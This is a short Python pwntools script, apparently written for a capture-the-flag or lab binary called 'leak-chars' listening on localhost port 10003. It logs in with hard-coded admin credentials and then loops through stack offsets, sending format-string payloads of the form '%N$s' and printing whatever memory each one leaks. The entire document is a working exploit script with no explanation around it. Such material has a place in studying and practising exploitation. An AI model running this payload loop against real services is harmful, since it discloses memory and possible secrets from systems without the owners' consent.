from pwn import *

elf = context.binary = ELF('./leak-chars', checksec=False)


for i in range(100):
    try:
        p = remote('127.0.0.1', 10003, level='error')
        p.sendlineafter(b':', b'admin')
        p.sendlineafter(b':', b'password')
        p.sendlineafter(b'> ', '%{}$s'.format(i).encode())
        result = p.recvuntil(b'> ')
        print(str(i) + ': ' + str(result))
        p.close()
    except EOFError:
        pass